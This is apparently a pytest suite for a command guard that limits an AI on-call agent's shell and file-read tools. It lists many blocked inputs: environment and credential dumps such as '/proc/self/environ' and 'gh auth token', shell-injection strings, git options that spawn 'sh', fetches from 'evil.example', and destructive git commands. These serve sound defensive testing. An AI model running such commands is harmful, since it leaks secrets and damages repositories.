"""responder/guard.py on its own: no settings allow-list in front of it (#69 QA round 2).

The combined fixture in test_agent.py also applies the settings patterns, which hides gaps in the
guard. Here only `decide()` / `check_bash()` decide.
"""

from __future__ import annotations

import json
import shlex
from pathlib import Path

import pytest

from responder.guard import Blocked, Context, check_bash, decide


@pytest.fixture
def ctx(tmp_path: Path) -> Context:
    incident = tmp_path / "inc"
    clone = tmp_path / "clone"
    incident.mkdir()
    clone.mkdir()
    return Context(
        incident_dir=incident,
        clone_dir=clone,
        repo="owner/repo",
        prometheus_url="http://127.0.0.1:9090",
        loki_url="http://127.0.0.1:3100",
        tempo_url="http://127.0.0.1:3200",
    )


def fill(command: str, ctx: Context) -> str:
    return command.replace("{clone}", str(ctx.clone_dir)).replace("{inc}", str(ctx.incident_dir))


def bash(command: str) -> dict[str, object]:
    return {"tool_name": "Bash", "tool_input": {"command": command}}


# --- gap 1: oncall/ops/* spellings -------------------------------------------------------------


@pytest.mark.parametrize(
    "command",
    [
        "oncall/ops/other.sh",
        "oncall/ops/",
        "oncall/ops/flag.sh.bak a b",
        "oncall/ops/../ops/rollback.sh",
        "oncall//ops/rollback.sh",
        "./oncall/ops/rollback.sh",
        "/opt/fitwise-oncall/app/oncall/ops/rollback.sh",
        "oncall/ops/rollback.sh/",
        "ONCALL/ops/rollback.sh",
        "bash oncall/ops/rollback.sh",
        "sh -c oncall/ops/rollback.sh",
        "env oncall/ops/rollback.sh",
        "FOO=1 oncall/ops/rollback.sh",
        "rollback.sh",
        "/opt/fitwise/bin/rollback.sh",
        "deploy/rollback.sh",
        "oncall/ops/rollback.sh abc",
        "oncall/ops/restart.sh db",
        "oncall/ops/flag.sh onlykey",
    ],
)
def test_unrecognised_spellings_are_blocked_and_never_take_the_slot(command: str, ctx: Context):
    with pytest.raises(Blocked):
        decide(bash(command), ctx)
    assert not (ctx.incident_dir / "mitigation.json").exists()
    # the slot is still free for a correct call
    decide(bash("oncall/ops/rollback.sh"), ctx)
    assert (ctx.incident_dir / "mitigation.json").exists()


def test_canonical_mitigations_share_one_slot(ctx: Context):
    decide(bash("oncall/ops/restart.sh backend"), ctx)
    for second in (
        "oncall/ops/restart.sh frontend",
        "oncall/ops/rollback.sh",
        "oncall/ops/flag.sh progression_engine v1",
    ):
        with pytest.raises(Blocked, match="already applied"):
            decide(bash(second), ctx)
    assert json.loads((ctx.incident_dir / "mitigation.json").read_text())["command"] == (
        "oncall/ops/restart.sh backend"
    )


def test_check_bash_reports_mitigation_only_for_canonical_calls(ctx: Context):
    assert check_bash("oncall/ops/rollback.sh", ctx) is True
    assert check_bash("sleep 5", ctx) is False
    with pytest.raises(Blocked):
        check_bash("oncall/ops/unknown.sh", ctx)


# --- gap 2: git options are an allow-list ------------------------------------------------------


def git(ctx: Context, *args: str) -> str:
    return shlex.join(["git", "-C", str(ctx.clone_dir), *args])


@pytest.mark.parametrize(
    "args",
    [
        ("status",),
        ("status", "--short", "--branch"),
        ("diff",),
        ("diff", "--stat", "origin/main"),
        ("diff", "--cached", "--name-only"),
        ("diff", "origin/main..HEAD", "--", "backend/app/x.py"),
        ("log", "--oneline", "-n", "5"),
        ("log", "-5", "--stat"),
        ("show", "HEAD~1", "--stat"),
        ("show", "HEAD:backend/app/x.py"),
        ("grep", "-n", "-i", "-e", "finish", "--", "backend"),
        ("grep", "-C", "3", "-e", "raise", "origin/main"),
        ("checkout", "-b", "oncall/20261024T100000Z-abc", "origin/main"),
        ("checkout", "oncall/fix"),
        ("switch", "-c", "oncall/fix"),
        ("branch", "--list", "-a"),
        ("branch", "--show-current"),
        ("add", "backend/app/x.py", "backend/tests/test_x.py"),
        ("add", "-A"),
        ("commit", "-m", "Fix finish error"),
        ("commit", "-a", "--amend", "--no-edit"),
        ("fetch",),
        ("fetch", "origin"),
        ("rev-parse", "--short", "HEAD"),
        ("ls-files", "-o", "--exclude-standard"),
        ("push", "origin", "oncall/fix"),
        ("push", "-u", "origin", "oncall/fix"),
    ],
)
def test_allowed_git_shapes(args: tuple[str, ...], ctx: Context):
    check_bash(git(ctx, *args), ctx)


@pytest.mark.parametrize(
    "args",
    [
        # abbreviated long options: git would expand each of these to a dangerous one
        ("diff", "--out=/tmp/x"),
        ("diff", "--output=/tmp/x"),
        ("log", "--out", "/tmp/x"),
        ("log", "--output=/tmp/x"),
        ("show", "--ext", "HEAD"),
        ("diff", "--ext-diff"),
        ("diff", "--no-ind", "/etc/passwd", "/etc/hosts"),
        ("diff", "--no-index", "/etc/passwd", "/etc/hosts"),
        ("grep", "--no-ind", "-e", "root", "/etc/passwd"),
        ("grep", "--no-index", "-e", "root", "/etc/passwd"),
        ("grep", "--open-files-in-pager=sh", "-e", "x"),
        ("grep", "--open-f=sh", "-e", "x"),
        ("grep", "-O", "-e", "x"),
        ("grep", "-Osh", "-e", "x"),
        ("grep", "-f", "/etc/passwd"),
        ("grep", "--file=/etc/passwd"),
        ("grep", "--recurse-submodules", "-e", "x"),
        ("grep", "--cache", "-e", "x"),  # abbreviation of --cached: still refused, exact only
        ("grep", "-ni", "-e", "x"),  # combined short flags are not parsed
        ("log", "--format=%H"),
        ("log", "--pretty=oneline"),
        ("log", "--exec-path=/tmp"),
        ("log", "--all"),
        ("log", "-n", "five"),
        ("checkout", "-B", "main"),
        ("checkout", "-b", "main"),
        ("checkout", "-b", "feature/x"),
        ("checkout", "--orphan", "x"),
        ("checkout", "--force", "main"),
        ("checkout", "-f", "main"),
        ("checkout", "--track", "origin/main"),
        ("checkout", "--", "/etc/passwd"),
        ("checkout", "--", "../outside"),
        ("checkout", "../outside"),
        ("branch", "-D", "main"),
        ("branch", "--delete", "x"),
        ("branch", "-m", "main", "x"),
        ("branch", "--set-upstream-to=origin/main"),
        ("add", "--intent-to-add", "x"),
        ("add", "-i"),
        ("add", "/etc/passwd"),
        ("add", "~/x"),
        ("add", "../x"),
        ("commit", "-m", "x", "--no-verify"),
        ("commit", "-n", "-m", "x"),
        ("commit", "--author=a", "-m", "x"),
        ("commit", "-F", "/etc/passwd"),
        ("commit", "-m", "x", "extra-path"),
        ("fetch", "origin", "--upload-pack=sh"),
        ("fetch", "https://evil.example/x.git"),
        ("fetch", "--all"),
        ("status", "--git-dir=/tmp"),
        ("status", "--ignored=matching"),
        ("rev-parse", "--git-dir"),
        ("ls-files", "--others", "--directory"),
        ("ls-files", "--exclude-from=/etc/passwd"),
        ("show", "--output=/tmp/x", "HEAD"),
        ("show", "/etc/passwd"),
        ("diff", "HEAD", "--", "/etc/passwd"),
        ("push", "origin", "main"),
        ("push", "origin", "HEAD:main"),
        ("push", "origin", "oncall/x:main"),
        ("push", "--force", "origin", "oncall/x"),
        ("push", "--mirror", "origin"),
        ("push", "origin", "oncall/x", "main"),
        ("config", "alias.x", "!sh"),
        ("remote", "add", "x", "https://evil.example"),
        ("reset", "--hard"),
        ("clean", "-fdx"),
        ("clone", "https://evil.example/x.git"),
        ("submodule", "update"),
        ("-c", "core.pager=sh", "log"),
    ],
)
def test_other_git_shapes_are_blocked(args: tuple[str, ...], ctx: Context):
    with pytest.raises(Blocked):
        check_bash(git(ctx, *args), ctx)


def test_git_must_target_the_separate_clone(ctx: Context, tmp_path: Path):
    for command in (
        "git status",
        f"git -C {tmp_path} status",
        f"git -C {ctx.clone_dir}/.. status",
        f"git --git-dir={ctx.clone_dir}/.git status",
        f"git -c core.pager=sh -C {ctx.clone_dir} log",
    ):
        with pytest.raises(Blocked):
            check_bash(command, ctx)


def test_git_option_table_has_no_prefix_matching():
    from responder.guard import GIT_OPTIONS

    for sub, (flags, valued) in GIT_OPTIONS.items():
        for opt in (*flags, *valued):
            assert not opt.endswith("="), (sub, opt)


# --- QA round 2 cases (copied from the QA scratch file) ---------------------------------------


def test_commit_msgfile_is_the_exact_incident_file(ctx: Context):
    clone, inc = ctx.clone_dir, ctx.incident_dir
    check_bash(f"git -C {clone} commit -F {inc}/commit-msg.txt", ctx)
    for value in (
        f"{inc}/../inc/commit-msg.txt",
        f"{inc}//commit-msg.txt",
        f"{inc}/./commit-msg.txt",
        f"{inc}/issue.md",
        "commit-msg.txt",
        f"{clone}/commit-msg.txt",
    ):
        with pytest.raises(Blocked):
            check_bash(f"git -C {clone} commit -F {value}", ctx)


@pytest.mark.parametrize(
    "args",
    [
        "grep -e x -- backend/../../etc",
        "log -- ../x",
        "show HEAD -- a/../../b",
        "diff -- ~/x",
        "grep -e x *",
        "add backend/*",
        "log -5 -- $HOME",
    ],
)
def test_git_positionals_stay_inside_the_clone(args: str, ctx: Context):
    with pytest.raises(Blocked):
        check_bash(f"git -C {ctx.clone_dir} {args}", ctx)


@pytest.mark.parametrize(
    "command",
    [
        "git -C {clone} commit -m $GH_TOKEN",
        'git -C {clone} commit -m "fix $ANTHROPIC_API_KEY"',
        "gh issue create --repo owner/repo --label incident --title $GH_TOKEN "
        "--body-file {inc}/issue.md",
        "gh pr create --repo owner/repo --head oncall/x --base main --title $GH_TOKEN "
        "--body-file {inc}/pr.md",
        "curl -sG http://127.0.0.1:9090/api/v1/query --data-urlencode query=$GH_TOKEN",
    ],
)
def test_free_text_values_cannot_expand_environment_variables(command: str, ctx: Context):
    with pytest.raises(Blocked):
        check_bash(fill(command, ctx), ctx)


# --- F4: nothing the shell would expand, nothing that prints the environment -------------------


@pytest.mark.parametrize(
    "command",
    [
        "sleep $X",
        "sleep 1$X",
        "docker compose logs $SERVICE",
        "docker compose ps --format '$GH_TOKEN'",
        "docker compose ps --format '${GH_TOKEN}'",
        "git -C {clone} commit -m $'x'",
        "git -C {clone} commit -m 'a $B'",
        "gh issue create --repo owner/repo --label incident --title '$GH_TOKEN' --body-file {inc}/issue.md",
        "git -C {clone} commit -m `id`",
        'git -C {clone} commit -m "$(id)"',
        'git -C {clone} commit -m "a\\nb"',
        'git -C {clone} commit -m "wow!"',
        "git -C {clone} log -n 3 !!",
        "git -C {clone} add ~",
        "git -C {clone} add ~root/x",
        "git -C {clone} add *.py",
        "git -C {clone} add file?.py",
        "git -C {clone} add [a]b",
        "git -C {clone} add {a,b}",
        "git -C {clone} commit -m x # note",
        "docker compose ps <(id)",
        "docker compose ps >/tmp/x",
        "docker compose ps | cat",
        "docker compose ps; id",
        "docker compose ps & id",
        "docker compose ps && id",
        "sleep 1\nid",
    ],
)
def test_no_shell_expansion_is_possible(command: str, ctx: Context):
    with pytest.raises(Blocked):
        check_bash(fill(command, ctx), ctx)


def test_quoted_free_text_without_expansion_is_still_fine(ctx: Context):
    check_bash(f"git -C {ctx.clone_dir} commit -m 'Fix: finish raised KeyError (see #12)'", ctx)
    check_bash(f'git -C {ctx.clone_dir} commit -m "Fix: finish raised KeyError"', ctx)
    check_bash(
        "curl -sG http://127.0.0.1:3100/loki/api/v1/query_range --data-urlencode "
        '\'query={service_name="fitwise-backend"} | detected_level=~"error"\'',
        ctx,
    )


@pytest.mark.parametrize(
    "command",
    [
        "env",
        "printenv",
        "printenv GH_TOKEN",
        "set",
        "export",
        "export -p",
        "declare -x",
        "cat /proc/self/environ",
        "cat /proc/1/environ",
        "strings /proc/self/environ",
        "gh auth token",
        "gh auth status -t",
        "gh auth status --show-token",
        "gh config get oauth_token",
        "gh api user",
        "gh secret list",
        "gh issue view 1",
        "gh pr create --repo owner/repo --head oncall/x --base main --title t --body-file /proc/self/environ",
        "git -C {clone} config --list",
        "git -C {clone} config credential.helper",
        "git -C {clone} config --get-all credential.helper",
        "git -C {clone} credential fill",
        "git -C {clone} remote -v",
        "git -C {clone} remote get-url origin",
        "git -C {clone} var -l",
        "git -C {clone} show-ref",
        "git -C {clone} for-each-ref",
        "git -C {clone} help",
        "docker compose config",
        "docker compose exec backend env",
        "docker compose run backend env",
        "docker compose convert",
        "docker inspect fitwise-backend-1",
        "docker compose logs --follow",
        "docker compose logs -e",
        "bash -c env",
        "sh -c 'cat /proc/self/environ'",
        "python3 -c 'import os'",
        "cat {inc}/guard.json",
        "echo x",
        "xargs env",
        "curl file:///proc/self/environ",
        "curl -sG http://127.0.0.1:9090/api/v1/query --config /proc/self/environ",
    ],
)
def test_nothing_that_prints_the_environment_or_credentials_is_allowed(command: str, ctx: Context):
    with pytest.raises(Blocked):
        check_bash(fill(command, ctx), ctx)


def test_reading_environ_through_the_file_tools_is_blocked(ctx: Context):
    for path in ("/proc/self/environ", "/proc/1/environ", "/etc/fitwise-oncall.env"):
        with pytest.raises(Blocked):
            decide({"tool_name": "Read", "tool_input": {"file_path": path}}, ctx)
    link = ctx.clone_dir / "env-link"
    link.symlink_to("/proc/self/environ")
    with pytest.raises(Blocked):
        decide({"tool_name": "Read", "tool_input": {"file_path": str(link)}}, ctx)


# --- QA notes: editor-less commit, no path restore through checkout -----------------------------


def test_commit_without_a_message_is_refused(ctx: Context):
    for args in (("commit",), ("commit", "-a"), ("commit", "--amend"), ("commit", "-s")):
        with pytest.raises(Blocked, match="needs -m or -F"):
            check_bash(git(ctx, *args), ctx)
    check_bash(git(ctx, "commit", "--amend", "--no-edit"), ctx)
    check_bash(git(ctx, "commit", "-m", "x"), ctx)


def test_checkout_cannot_restore_paths(ctx: Context):
    (ctx.clone_dir / "deploy").mkdir()
    (ctx.clone_dir / "deploy" / "poll.sh").write_text("x")
    for args in (
        ("checkout", "origin/main", "deploy/poll.sh"),
        ("checkout", "origin/main", "--", "deploy/poll.sh"),
        ("checkout", "--", "deploy/poll.sh"),
        ("checkout", "deploy/poll.sh"),
        ("checkout", "deploy"),
        ("checkout", "-b", "oncall/x", "origin/main", "deploy/poll.sh"),
        ("checkout", "-b", "oncall/x", "deploy/poll.sh"),
        ("checkout", "-b", "oncall/x", "a", "b"),
        ("checkout", "-b"),
        ("checkout",),
        ("checkout", "a", "b"),
    ):
        with pytest.raises(Blocked):
            check_bash(git(ctx, *args), ctx)
    check_bash(git(ctx, "checkout", "oncall/fix"), ctx)
    check_bash(git(ctx, "checkout", "origin/main"), ctx)
    check_bash(git(ctx, "checkout", "-b", "oncall/x"), ctx)
    check_bash(git(ctx, "checkout", "-b", "oncall/x", "origin/main"), ctx)
